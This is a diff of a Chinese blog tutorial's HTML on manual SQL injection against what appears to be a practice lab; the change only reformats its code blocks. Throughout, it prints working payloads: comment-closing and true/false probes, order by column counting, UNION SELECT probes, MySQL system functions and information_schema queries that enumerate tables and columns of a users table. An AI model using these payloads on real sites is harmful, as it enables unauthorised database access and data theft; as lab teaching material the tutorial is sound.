@@ -181,48 +181,23 @@
 <h3 id="引导闭合语句"><a href="#引导闭合语句" class="headerlink" title="引导闭合语句"></a>引导闭合语句</h3><p><code>id =1 &#39; and &#39;1&#39; =&#39;1</code></p>
 <p>带入进源码中的SQL语句就是:</p>
 <p><code>SELECT * FROM users WHERE id=&#39;1 &#39; and &#39;1&#39; = &#39;1&#39; LIMIT 0,1</code></p>
-<h3 id="注释后面语句"><a href="#注释后面语句" class="headerlink" title="注释后面语句"></a>注释后面语句</h3><p>常用的注释payload：</p>
-<pre><code>or 1=1--+
-&#39;or 1=1--+
-&quot;or 1=1--+
-)or 1=1--+
-&#39;)or 1=1--+
-&quot;) or 1=1--+
-&quot;))or 1=1--+
---+ 可以用#替换，url 提交过程中 Url 编码后的#为%23
-</code></pre><p>带入进源码中的SQL语句就是:</p>
+<h3 id="注释后面语句"><a href="#注释后面语句" class="headerlink" title="注释后面语句"></a>注释后面语句</h3><p>常用的注释payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br><span class="line">--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23</span><br></pre></td></tr></table></figure></p>
+<p>带入进源码中的SQL语句就是:</p>
 <p><code>SELECT * FROM users WHERE id=&#39;&#39;or 1=1--+&#39; LIMIT 0,1</code></p>
 <p>这样可以看出直接把后面的语句都给注释掉了，一般实战用注释比较多。</p>
 <h2 id="and验证"><a href="#and验证" class="headerlink" title="and验证"></a>and验证</h2><p>当然这里 and 验证和 or 验证都可以，二者区别不大:</p>
-<p><strong>页面返回正常</strong></p>
-<pre><code>?id=1&#39; and 1=1 --+
-?id=1&#39; or 1=2 --+
-</code></pre><p><strong>页面返回异常</strong></p>
-<pre><code>?id=1&#39; and 1=2 --+
-?id=1&#39; or 1=1 --+  
-</code></pre><p>如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。</p>
-<h2 id="查询字段数目"><a href="#查询字段数目" class="headerlink" title="查询字段数目"></a>查询字段数目</h2><p>查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。</p>
-<pre><code>?id=1&#39; order by 1 –-+ 此时页面正常，继续换更大的数字测试
-?id=1&#39; order by 10 –-+ 此时页面返回错误，更换小的数字测试
-?id=1&#39; order by 5 –-+ 此时页面依然报错，继续缩小数值测试
-?id=1&#39; order by 3 –-+ 此时页面返回正常，更换大的数字测试
-?id=1&#39; order by 4 –-+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3
-</code></pre><p>通过数学的对半查找，确定字段数目。</p>
+<p><strong>页面返回正常</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=1 --+</span><br><span class="line">?id=1&apos; or 1=2 --+</span><br></pre></td></tr></table></figure></p>
+<p><strong>页面返回异常</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=2 --+</span><br><span class="line">?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure></p>
+<p>如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。</p>
+<h2 id="查询字段数目"><a href="#查询字段数目" class="headerlink" title="查询字段数目"></a>查询字段数目</h2><p>查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; order by 1 –-+ 此时页面正常，继续换更大的数字测试</span><br><span class="line">?id=1&apos; order by 10 –-+ 此时页面返回错误，更换小的数字测试</span><br><span class="line">?id=1&apos; order by 5 –-+ 此时页面依然报错，继续缩小数值测试</span><br><span class="line">?id=1&apos; order by 3 –-+ 此时页面返回正常，更换大的数字测试</span><br><span class="line">?id=1&apos; order by 4 –-+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3</span><br></pre></td></tr></table></figure></p>
+<p>通过数学的对半查找，确定字段数目。</p>
 <h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过UNION把我们的恶意注入语句接上去，带入数据库进行查询。<br>因为字段数目是:3,那么正规的语句如下:</p>
 <p><code>?id=1&#39; UNION SELECT 1,2,3 --+</code></p>
 <p>这里页面是不会报错的，此时我们带入数据库的语句为:</p>
-<p><code>SELECT 1,2,3 这段语句没有任何意义，所以页面按返回正常。</code><br><img src="/2019/04/01/sql-zhu-ru-zhi-shou-gong-zhu-ru/sql3.jpg" alt="union查询"><br>但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段：</p>
-<pre><code>id=-1&#39; UNION SELECT 1,2,3 –-+ 通过id=-1 一个负数不存在的id值来触发报错
-id=1&#39; and 1=2 UNION SELECT 1,2,3 –-+ 通过and 1=2 语句来触发报错
-id=1&#39; or 1=1 UNION SELECT 1,2,3 –-+ 通过or 1=1 语句来触发报错
-</code></pre><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>在爆出的字段值里面可以<code>替换</code>为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:</p>
-<p><strong>MySQL常用的系统函数:</strong></p>
-<pre><code>version()            #MySQL版本
-user()               #数据库用户名
-database()           #数据库名
-@@datadir            #数据库路径
-@@version_compile_os #操作系统版本
-</code></pre><p><strong>查询当前数据库名</strong></p>
+<p><code>SELECT 1,2,3 这段语句没有任何意义，所以页面按返回正常。</code><br><img src="/2019/04/01/sql-zhu-ru-zhi-shou-gong-zhu-ru/sql3.jpg" alt="union查询"><br>但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; UNION SELECT 1,2,3 –-+ 通过id=-1 一个负数不存在的id值来触发报错</span><br><span class="line">id=1&apos; and 1=2 UNION SELECT 1,2,3 –-+ 通过and 1=2 语句来触发报错</span><br><span class="line">id=1&apos; or 1=1 UNION SELECT 1,2,3 –-+ 通过or 1=1 语句来触发报错</span><br></pre></td></tr></table></figure></p>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>在爆出的字段值里面可以<code>替换</code>为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:</p>
+<p><strong>MySQL常用的系统函数:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure></p>
+<p><strong>查询当前数据库名</strong></p>
 <p><code>id=1&#39; and 1=2 UNION SELECT 1,database(),3 --+</code></p>
 <p><img src="/2019/04/01/sql-zhu-ru-zhi-shou-gong-zhu-ru/sql4.jpg" alt=""><br><strong>查询MySQL版本</strong></p>
 <p><code>id=1&#39; and 1=2 UNION SELECT 1,2,version() --+</code></p>
@@ -242,10 +217,8 @@ database()           #数据库名
 <p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="/2019/04/01/sql-zhu-ru-zhi-shou-gong-zhu-ru/sql10.jpg" alt=""><br><strong>hex编码数据库</strong><br>如果嫌单引号括起来麻烦的话，那么巧了！这里还有一个更麻烦的方法，就是将数据库名进行<code>hex</code>编码处理。<br>使用火狐自带的<code>HackBar</code>插件可以快速的进行<code>hex</code>编码:<br><img src="/2019/04/01/sql-zhu-ru-zhi-shou-gong-zhu-ru/sql11.gif" alt=""></p>
 <p>hex编码后在前面加上0x表明这里是16进制编码。</p>
 <p><img src="/2019/04/01/sql-zhu-ru-zhi-shou-gong-zhu-ru/sql12.jpg" alt=""></p>
-<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><p>目前收集到的信息为:</p>
-<pre><code>数据库名称: securuty
-数据库表名: emails,referers,uagents,users
-</code></pre><p>这几个表中 一般我们都会去 继续猜解<code>users</code>表。</p>
+<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><p>目前收集到的信息为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库名称: securuty</span><br><span class="line">数据库表名: emails,referers,uagents,users</span><br></pre></td></tr></table></figure></p>
+<p>这几个表中 一般我们都会去 继续猜解<code>users</code>表。</p>
 <p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
 <p><img src="/2019/04/01/sql-zhu-ru-zhi-shou-gong-zhu-ru/sql13.jpg" alt=""></p>
 <h2 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h2><p>知道了数据库、表名、各个字段名可以直接进行查询了，不需借助<code>information_schanem</code>数据库了。</p>
